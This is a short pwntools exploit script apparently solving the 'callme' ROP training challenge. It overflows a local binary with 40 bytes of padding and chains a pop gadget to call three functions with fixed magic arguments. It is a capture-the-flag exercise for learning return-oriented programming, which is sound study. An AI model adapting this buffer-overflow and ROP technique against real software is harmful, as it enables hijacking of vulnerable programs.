
from pwn import *

exe = './callme'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()
callme1 = p64(0x0000000000400720)
callme2 = p64(0x0000000000400740)
callme3 = p64(0x00000000004006f0)
ret = p64(0x00000000004006be)
arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)
pop_gadget = p64(0x40093c)

p.sendline(40*b"a"+ ret + pop_gadget + arg1 + arg2 + arg3 + callme1 + pop_gadget + arg1 + arg2 + arg3 + callme2 + pop_gadget + arg1 + arg2 + arg3 + callme3)

p.interactive()

